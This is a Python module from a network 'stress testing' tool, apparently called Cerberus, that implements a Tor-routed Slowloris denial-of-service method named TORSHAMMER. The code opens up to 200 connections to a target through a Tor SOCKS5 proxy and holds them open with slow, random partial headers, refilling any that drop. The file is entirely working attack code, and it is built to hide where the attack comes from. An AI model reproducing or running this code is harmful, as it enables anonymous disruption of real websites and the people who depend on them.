'''

Cerberus, a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
Copyright (C) 2022  Nexus/Nexuzzzz

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

'''

import time, ssl

from random import randint, uniform
from python_socks.sync import Proxy

from src.core import Core
from src.utils import *
from src.useragent import *

def open_socket() -> Proxy | None: # opens a new socket, and returns it
    '''
    open_socket(h) -> Proxy object or None

    Opens a socket using TOR as SOCKS5 proxy

    :returns python_socks.sync.Proxy | None: Proxy object if sucess, False if not
    '''

    connected, proxy = False, Proxy
    for _ in range(10): # try to restart TOR atleast 10 times
        if connected: break

        try: 
            proxy = Proxy.from_url('socks5://127.0.0.1:9049')
            connected = True

        except Exception:
            utils().launch_tor() # launch tor
            continue
    
    if not connected:
        return

    try:
        socket = proxy.connect(Core.target_host, Core.target_port) # connect

        if Core.target_port == 443: # if the port is HTTPS (HTTP over SSL/TLS), wrap the socket
            socket = ssl.create_default_context().wrap_socket(
                sock=socket,
                server_hostname=Core.target_host
            )
    except Exception:
        return None

    return socket

def flood(attack_id, url, stoptime) -> None:

    if not Core.target_host: Core.target_host = urlparse(url).hostname # set host if not already set
    if not Core.target_port: Core.target_port = urlparse(url).port if urlparse(url).port else (80 if urlparse(url).scheme == 'http' else 443) # set port if not already set

    if Core.sockets == []:
        for _ in range(200):
            sock = open_socket()

            if sock:
                Core.sockets.append(sock)
                Core.infodict[attack_id]['conn_opened'] += 1 # count a new connection

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue
        
        for sock in Core.sockets:
            try:
                sock.send(f'X-a: {str(randint(1, 4600))}\r\n'.encode())

                Core.infodict[attack_id]['req_sent'] += 1
            except Exception:
                Core.infodict[attack_id]['req_fail'] += 1
            
            Core.infodict[attack_id]['req_total'] += 1
            time.sleep(uniform(3,10))
        
        for _ in range(200-len(Core.sockets)): # open new sockets to fill the list again
            sock = open_socket()

            if sock:
                Core.sockets.append(sock)
                Core.infodict[attack_id]['conn_opened'] += 1
    
    for sock in Core.sockets: # cleanup
        sock.close()

    Core.threadcount -= 1

Core.methods.update({
    'TORSHAMMER': {
        'info': 'Slowloris attack using the TOR network',
        'func': flood
    }
})